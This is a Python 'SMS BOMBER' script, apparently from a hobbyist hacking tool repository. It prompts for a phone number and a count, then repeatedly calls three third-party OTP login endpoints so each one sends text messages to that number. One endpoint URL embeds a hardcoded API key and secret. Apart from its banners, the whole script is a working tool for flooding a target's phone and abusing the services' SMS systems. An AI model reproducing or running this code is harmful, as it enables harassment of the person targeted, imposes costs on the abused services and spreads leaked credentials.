import requests
import smtplib
import sys
import os  
import time
import socket
import random
import pyfiglet
from requests.structures import CaseInsensitiveDict


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

ascii_banner = pyfiglet.figlet_format("Thanks To")
print(ascii_banner)
ascii_banner = pyfiglet.figlet_format("Using My tools")
print(ascii_banner)
print ("\033[32m")
psb("#------------------------------------------------#")
psb("""███████╗███╗   ███╗███████╗                         
██╔════╝████╗ ████║██╔════╝                         
███████╗██╔████╔██║███████╗                         
╚════██║██║╚██╔╝██║╚════██║                         
███████║██║ ╚═╝ ██║███████║                         
╚══════╝╚═╝     ╚═╝╚══════╝                         
                                                    
██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
-----------------------------------------------------------------------       
               ~~~Developer By D1ARK-VA4U3~~~
------------------------------------------------------------------------                                   
""")
time.sleep(2)
print ("\033[32m")
psb("\n\n[!] Loading.....")
time.sleep(1)
psb("\n[!] Please Wait.....")
time.sleep(1.9)
os.system("clear")

print ("\033[36m")
print("""
#------------------------------------------------#
#  		     SMS BOMBER           	 #
#             CODED BY : D1ARK-VA4U3             #
#------------------------------------------------#
#  Github  : https://github.com/D1ARK-VA4U3/     #
# Facebook: https://www.facebook.com/Arif.vau143 #
#  Telegram : https://t.me/D1arkva4u3 	 #
#------------------------------------------------#
#               【﻿ Thanks to Rh King】 	 	 #
#------------------------------------------------#
""")

number=str(input("Enter Your Number :"))
amount=int(input("Enter Your Amount :"))
url1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone="+number


resp1 = requests.post(url1, headers=headers1, data=data1)

url2 = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"
headers2["Content-Length"] = "0"

api3="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for j in range (amount):
	resp1 = requests.post(url1, headers=headers1, data=data1)
	resp2 = requests.post(url2, headers=headers2)
	requests.get(api3)
	print(resp1.text)
	print(resp2.text)
	print(str(j+1)+"SENT SMS SUCCESSFUL")



